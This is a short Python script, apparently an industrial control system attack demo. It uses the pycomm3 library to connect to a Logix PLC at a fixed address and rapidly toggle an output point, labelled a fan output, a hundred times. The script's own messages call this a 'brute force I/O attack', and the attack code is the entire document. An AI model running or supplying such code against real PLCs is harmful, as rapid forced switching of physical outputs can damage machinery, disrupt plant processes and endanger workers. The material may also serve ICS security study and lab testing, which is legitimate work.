from pycomm3 import LogixDriver
import time

def find_plc_ip():
    # This function should scan the network to find the PLC's IP address.
    # For simplicity, we'll assume the IP is already known or manually set.
    # Replace '192.168.1.10' with the actual PLC IP address.
    return '192.168.1.10'

def brute_force_io(plc_ip):
    try:
        # Connect to the PLC
        with LogixDriver(plc_ip) as plc:
            print(f"Connected to PLC at {plc_ip}")

            # Define the I/O point to brute force (e.g., _IO_EM_DO_02 for Fan output)
            io_point = '_IO_EM_DO_02'

            # Number of times to toggle the I/O point
            iterations = 100

            # Brute force the I/O point
            for i in range(iterations):
                # Toggle the I/O point
                plc.write(io_point, True)
                print(f"Set {io_point} to TRUE")
                time.sleep(0.1)  # Short delay

                plc.write(io_point, False)
                print(f"Set {io_point} to FALSE")
                time.sleep(0.1)  # Short delay

            print("Brute force I/O attack completed.")

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    # Find the PLC's IP address
    plc_ip = find_plc_ip()
    print(f"Found PLC IP: {plc_ip}")

    # Perform brute force I/O attack
    brute_force_io(plc_ip)